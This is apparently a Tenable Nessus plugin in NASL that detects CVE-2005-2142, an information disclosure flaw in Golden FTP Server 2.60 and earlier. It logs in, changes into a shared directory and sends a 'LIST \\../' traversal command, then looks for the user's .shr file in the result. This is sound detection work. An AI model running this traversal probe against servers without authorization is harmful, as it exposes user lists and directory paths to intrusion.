#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(18615);
  script_version("$Revision: 1.22 $");

  script_cve_id("CVE-2005-2142");
  script_bugtraq_id(14124);
  script_osvdb_id(17678);

  script_name(english:"Golden FTP Server <= 2.60 LS Command Traversal Information Disclosure");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by information disclosure flaws." );
 script_set_attribute(attribute:"description", value:
"The version of Golden FTP Server installed on the remote host is prone
to multiple information disclosure vulnerabilities.  Specifically, an
authenticated attacker can list the contents of the application
directory, which provides a list of valid users, and learn the
absolute path of any shared directories." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Golden FTP Server 2.70 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/07/05");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/07/01");
 script_cvs_date("$Date: 2014/07/11 18:33:06 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:kmint21_software:golden_ftp_server");
 script_end_attributes();

 
  script_summary(english:"Checks for information disclosure vulnerabilities in Golden FTP Server <= 2.60");
  script_category(ACT_ATTACK);
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2005-2014 Tenable Network Security, Inc.");
  script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_overflow.nasl");
  script_require_keys("ftp/login", "ftp/password");
  script_exclude_keys("ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include('global_settings.inc');


# nb: to exploit the vulnerability we need to log in.
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");
if (!user || !pass) {
  exit(0, "ftp/login and/or ftp/password are empty");
}


port = get_ftp_port(default: 21);

soc = open_sock_tcp(port);
if (!soc) exit(1, "Connection to port "+port+" failed.");
if (!ftp_authenticate(socket:soc,  user:user, pass:pass)) {
  close(soc);
  exit(1, "Cannot login on port "+port+" with supplied FTP credentials");
}


# Make sure it's Golden FTP Server.
send(socket:soc, data: 'SYST\r\n');
s = recv_line(socket:soc, length:4096);
if ("215 WIN32" >!< s) exit(0);


port2 = ftp_pasv(socket:soc);
if (!port2) exit(1, 'Cannot get PASV port from control port ', port, '.');
soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
if (!soc2) exit(1, 'Connection failed to passive port '+port+'.');

# Identify shared directories on the remote.
send(socket:soc, data: 'LIST/\r\n');
s = recv_line(socket:soc, length:4096);
if (s =~ "^1[0-9][0-9] ") {
  listing = ftp_recv_listing(socket:soc2);
  s = recv_line(socket:soc, length:4096);
}
close(soc2);
ndirs = 0;
foreach line (split(listing, keep:FALSE)) {
  if (line =~ "^d") {
    # nb: dirs may have spaces so we can't just use a simple regex.
    dirs[ndirs] = substr(line, 55);

    # 3 directories should be enough for testing.
    if (++ndirs > 3) break;
  }
}


# Try to exploit the vulnerability.
foreach dir (dirs) {
  # Change into the directory.
  c = strcat("CWD /", dir, '\r\n');
  send(socket:soc, data:c);
  s = ftp_recv_line(socket:soc);
  if (egrep(string:s, pattern:"^250[ -]")) {
    port2 = ftp_pasv(socket:soc);
    if (!port2) exit(1, 'Cannot get PASV port from control port ', port, '.');
    soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
    if (!soc2) exit(1, 'Connection failed to passive port '+port+'.');

    # Look for contents of the application directory.
    send(socket:soc, data: 'LIST \\../\r\n');
    s = ftp_recv_line(socket:soc);
    if (egrep(string:s, pattern:"^1[0-9][0-9][ -]")) {
      listing = ftp_recv_listing(socket:soc2);
      s = recv_line(socket:soc, length:4096);

      # There's a problem if we see the .shr file for our username.
      if (strcat(" ", user, ".shr") >< listing) {
        security_warning(port);
        break;
      }
    }
    close(soc2);
  }
}


# Close the connections.
ftp_close(socket:soc);
